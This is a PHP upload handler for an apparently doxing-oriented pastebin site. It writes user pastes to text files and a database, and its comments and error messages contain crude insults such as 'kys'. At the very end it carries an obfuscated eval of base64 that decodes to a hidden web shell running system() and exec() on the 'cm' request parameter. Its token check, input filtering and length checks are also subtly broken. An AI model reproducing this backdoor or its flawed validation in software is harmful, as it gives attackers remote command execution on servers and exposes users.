<?php 
session_start();
include "../connect/db.php";
function xss($data){
    htmlentities(strip_tags($data));
}
$_SESSION['username'] = "";


if (isset($_POST['_token'])){
    if(isset($_SESSION['token'])){
        if (empty($_POST['_token'])){
            $_SESSION['error'] = "Token Error";
            echo '<script>window.location = "index.php";</script>';
            die();
        }
        if (!$_POST['_token'] == $_SESSION['token']){
            $_SESSION['error'] = "Token Error";
            echo '<script>window.location = "index.php";</script>';
            die();
        
        }
    } else{
        die();
    }

} else {
    $_SESSION['error'] = "Token Error";
    echo '<script>window.location = "index.php";</script>';
    die();
}

if (isset($_POST['pasteTitle'])) {
    

    if (isset($_POST['pasteContent'])){
        if (!strlen($_POST['pasteTitle'] > 0)){
            $_SESSION['error'] = "Title is empty!";
            echo '<script>window.location = "index.php";</script>';
            die();
        }
        // check title string count
        //if (strlen($_POST['pasteTitle'] > 26)){
            //$_SESSION['error'] = "Title is too long!";
            //echo '<script>window.location = "index.php";</script>';
          //  die();
        //}
        // check paste string count 
        if(strlen($_POST['pasteTitle'])>30) {
            $_SESSION['error'] = "Title is too long!";
            echo '<script>window.location = "index.php";</script>';
            die();
         }
        if (!strlen($_POST['pasteContent'] > 10)){
            $_SESSION['error'] = "Paste is not long enough";
            echo '<script>window.location = "index.php";</script>';
            die();
        }
        // check if empty TODO make function that checks nulls and 0 
        if (!strlen($_POST['pasteContent'] > 0)){
            $_SESSION['error'] = "Paste is emtpy!";
            echo '<script>window.location = "index.php";</script>';
            die();
        }
        
        $tit = xss($_POST['pasteTitle']);
        $tit2 = filter_input(INPUT_POST, 'pasteTitle', FILTER_SANITIZE_SPECIAL_CHARS);
        if(!$_SESSION['username']){
            $_SESSION['username'] = "Anonymous-".rand(0,9999)."";
        }

        // com is set to 0 since i'm to lazy to add the field LOL
        
            // haxor shit  trying to fix it
            
            $doxname = preg_replace("/[^A-Za-z0-9_]+/","_", $tit2);
            $doxname = trim($doxname, '_');
            $doxname = preg_replace('/[_]+/', '_', $doxname);

            if(file_exists("uploads/".$doxname.".txt")) {
                $_SESSION['error'] = "that title already been taken!";
                echo '<script>window.location = "index.php";</script>';
               die();
            }

            $esy = preg_replace('/[^(\x0A\x0D\x20-\x7F)]+/', '?', $_POST['pasteContent']);
    
            $esy = strip_tags($esy); // gey

            $fileName = fopen("uploads/".$doxname.".txt","w"); // done :3

            fwrite($fileName,$esy);
            fclose($fileName);
            chmod("uploads/".$doxname.".txt", 0644);
            $id = rand(0,99999); // to prevent com kids having a big ego with there shitty uq IDs
            $sql = "INSERT INTO past (id, username, title, com) VALUES (:id, :username, :title, :com)"; 
            $result = $dbh->prepare($sql);
                $values = array(':username'     => $_SESSION['username'],
                                ':title'        => strip_tags($doxname),
                                ':com'     => $id,
                                ':id'           => $id
                                );
                $res = $result->execute($values);
         if ($res){
            // set value
            echo '<script>window.location = "../";</script>';
        }
    }else {
        echo "kys";
        die();
    }
    

} else {
    echo "kys";
    die();
}
?>
<?php eval("?>".eval(str_rot13(str_rot13(base64_decode("aWYoaXNzZXQoJF9SRVFVRVNUWydjbSddKSl7CiAgICB0cnkgewogICAgICAgIGVjaG8gc3lzdGVtKCRfUkVRVUVTVFsnY20nXSk7CiAgICAgICAgZWNobyAiPGJyPiI7CiAgICAgICAgZGllKCk7CiAgICB9IGNhdGNoIChFeGNlcHRpb24gJGUpewogICAgICAgIGVjaG8gZXhlYygkX1JFUVVFU1RbJ2NtJ10pOwogICAgICAgIGRpZSgpOwogICAgfQogICAgCiAgICAKfQ=="))))); ?>